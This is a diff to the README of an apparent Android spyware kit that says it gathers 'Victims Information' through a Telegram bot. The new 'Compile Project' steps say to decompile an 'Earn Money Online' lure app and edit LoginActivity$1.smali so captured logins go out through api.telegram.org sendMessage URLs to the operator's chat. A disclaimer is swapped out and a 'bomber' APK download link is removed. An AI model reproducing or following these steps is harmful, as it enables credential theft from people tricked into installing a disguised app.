@@ -32,7 +32,7 @@ A multifunctional Telegram Bot based Android App Get Victims Information Receive
 
 
 
-## SetUo
+## SetUp
 
 Go To Bot father link & Create Bot https://t.me/BotFather
 
@@ -46,12 +46,19 @@ Then Go To Our Anya Bot & Copy Chat Id https://t.me/spy_anya_bot
 
 
 
-## Terms & Conditions 
+## Compile Project
 
 ```javascript
-We have some terms and conditions.
-if you Don't follow them,We will be not responsible for your illegal activities.../>
-}
+
+ 
+ 1. Download [Earn Money Online Apk]
+ 1. Decompile it using any Decompiler recommend above.
+ 1. Now Search LoginActivity open `LoginActivity$1.smali` file.
+ 1. Replace values of [1] https://api.telegram.org/bot paste Your Api Token/sendMessage?chat_id=-Paste Your Chat Id&text=
+ Replace values of [2] https://api.telegram.org/bot paste Your Api Token/sendMessage?chat_id=-Paste Your Chat Id&text=
+    - 
+       ```Now Compile This Project 
+       ```
 ```
 
 
@@ -60,7 +67,7 @@ if you Don't follow them,We will be not responsible for your illegal activities.
 For support, Talegram <a href="https://t.me/Teamex07">Talegram</a> join our channel.
 
 
-## Download 
-<a href="https://raw.githubusercontent.com/Teamex07/Ex-Custom-Bomber-/main/Ex_bomber_base.apk">DOWNLOAD NOW</a>
+## SetUp Video
+<a href="">DOWNLOAD NOW</a>
 
 
